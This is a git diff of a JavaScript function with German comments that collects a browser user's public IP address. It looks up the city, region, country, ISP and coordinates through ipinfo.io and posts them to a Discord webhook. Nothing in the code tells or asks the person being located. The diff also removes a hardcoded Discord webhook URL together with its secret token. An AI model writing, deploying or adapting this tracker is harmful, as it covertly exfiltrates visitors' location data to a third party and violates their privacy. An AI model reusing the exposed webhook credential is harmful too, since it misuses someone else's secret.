@@ -1,17 +1,30 @@
 async function fetchAndSendIpAddress() {
     try {
         // Schritt 1: IP-Adresse abrufen
-        const response = await fetch('https://api.ipify.org/?format=json');
-        const data = await response.json();
+        const ipResponse = await fetch('https://api.ipify.org/?format=json');
+        const ipData = await ipResponse.json();
+        const ipAddress = ipData.ip;
 
-        // Die IP-Adresse ist im JSON-Daten unter dem Schlüssel 'ip' gespeichert
-        const ipAddress = data.ip;
+        // Schritt 2: Zusätzliche Informationen zur IP-Adresse abrufen
+        const token = import.meta.env.VITE_IPINFO_TOKEN;
+        const infoResponse = await fetch(`https://ipinfo.io/${ipAddress}/json?token=${token}`);
+        const infoData = await infoResponse.json();
 
-        // Schritt 2: IP-Adresse an Discord Webhook senden
-        const webhookURL = 'https://discord.com/api/webhooks/1266125230993178710/jAlkmKSYGpKc1ehon3g7aoibKfwsg-Aowu_uUipUambuIXXQ9LFo8bNLR0APME_T4OuO';
+        // Schritt 3: Nachricht zusammenstellen
+        const message = `
+            IP-Adresse: ${ipAddress}
+            Stadt: ${infoData.city || 'Nicht verfügbar'}
+            Region: ${infoData.region || 'Nicht verfügbar'}
+            Land: ${infoData.country || 'Nicht verfügbar'}
+            ISP: ${infoData.org || 'Nicht verfügbar'}
+            Geolocation: ${infoData.loc || 'Nicht verfügbar'}
+        `;
+
+        // Schritt 4: IP-Adresse und Informationen an Discord Webhook senden
+        const webhookURL = import.meta.env.VITE_DISCORD_WEBHOOK_URL;
 
         const payload = {
-            content: `Die IP-Adresse ist: ${ipAddress}`
+            content: message
         };
 
         const webhookResponse = await fetch(webhookURL, {
@@ -23,7 +36,7 @@ async function fetchAndSendIpAddress() {
         });
 
         if (webhookResponse.ok) {
-            console.log('IP-Adresse erfolgreich an Discord gesendet');
+            console.log('Informationen erfolgreich an Discord gesendet');
         } else {
             console.error('Fehler beim Senden an Discord', webhookResponse.statusText);
         }
